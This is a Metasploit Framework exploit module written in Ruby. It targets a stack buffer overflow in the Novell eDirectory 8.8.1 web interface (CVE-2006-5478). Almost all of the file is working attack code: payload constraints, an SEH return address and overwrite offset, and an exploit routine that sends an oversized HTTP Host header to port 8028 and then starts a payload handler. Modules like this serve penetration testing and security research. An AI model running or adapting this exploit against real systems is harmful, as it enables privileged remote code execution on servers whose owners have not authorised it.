##
# $Id: edirectory_host.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell eDirectory NDS Server Host Header Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell eDirectory 8.8.1.
				The web interface does not validate the length of the
				HTTP Host header prior to using the value of that header in an
				HTTP redirect.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					['CVE', '2006-5478'],
					['OSVDB', '29993'],
					['BID', '20655'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Novell eDirectory 8.8.1', { 'Ret' => 0x10085bee } ], # ntls.dll
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Oct 21 2006',
			'DefaultTarget' => 0))

		register_options([Opt::RPORT(8028)], self.class)
	end

	def exploit
		connect

		sploit =  "GET /nds HTTP/1.1" + "\r\n"
		sploit << "Host: " + rand_text_alphanumeric(9, payload_badchars)
		sploit << "," + rand_text_alphanumeric(719, payload_badchars)
		seh    = generate_seh_payload(target.ret)
		sploit[705, seh.length] = seh
		sploit << "\r\n\r\n"

		print_status("Trying target #{target.name}...")

		sock.put(sploit)

		handler
		disconnect
	end

end
